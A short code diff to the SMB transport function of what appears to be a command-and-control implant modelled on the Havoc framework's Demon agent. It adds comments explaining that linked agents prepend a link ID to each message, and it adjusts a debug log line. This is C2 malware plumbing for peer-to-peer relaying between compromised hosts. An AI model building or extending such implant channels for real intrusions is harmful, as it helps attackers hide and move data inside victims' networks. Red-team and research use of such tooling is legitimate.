@@ -15,18 +15,26 @@
  * @brief Send data to SMB C2 Channel
  * 
  * @ref https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/core/TransportSmb.c
+ * 
+ * @note For SMB agents acting as links, SmbId MUST match the LinkId that the
+ *       main agent expects. This ensures LinkPush() can properly verify messages.
+ *       All packages sent by SMB agents (including queued chunks from Download, etc.)
+ *       will have SmbId prepended via this function.
+ * 
  * @return BOOL  
  */
 BOOL SmbSend(PPackage package)
 {
 	BOOL   Success = FALSE;
 
-    /* Prepend P2P Linking ID to Package */
+    /* Prepend P2P Linking ID to Package
+     * This SmbId is used by the receiving agent (via LinkPush) to verify
+     * that the message came from the correct linked agent */
     PPackage Send = PackageInit(NULL, FALSE);
     PackageAddInt32(Send, xenonConfig->SmbId);
     PackageAddBytes(Send, package->buffer, package->length, FALSE);
 
-    _dbg("[SMB Comms] Sending msg with %d bytes : SmbId [%x]", package->length, xenonConfig->SmbId);
+    _dbg("[SMB Comms] Sending msg with %d bytes : LinkId [%x]", Send->length, xenonConfig->SmbId);
 
 	/* Not initialized Yet */
 	if ( !xenonConfig->SmbPipe )
